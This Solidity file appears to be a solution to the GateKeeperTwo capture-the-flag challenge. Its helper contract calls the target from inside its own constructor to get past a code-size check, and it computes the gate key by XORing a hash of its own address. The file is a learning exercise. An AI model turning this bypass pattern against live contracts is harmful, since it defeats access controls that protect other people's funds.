// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperTwo/GateKeeperTwo.sol";

contract GateKeeperTwoExploit {
    GateKeeperTwo victim;

    constructor(address _victim) {
        victim = GateKeeperTwo(payable(_victim));
    }

    function hack() public {
        new GateKeyHack(victim);
    }

    receive() external payable {}
}

contract GateKeyHack {
    constructor(GateKeeperTwo _victim) {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _victim.enter(key);
    }
}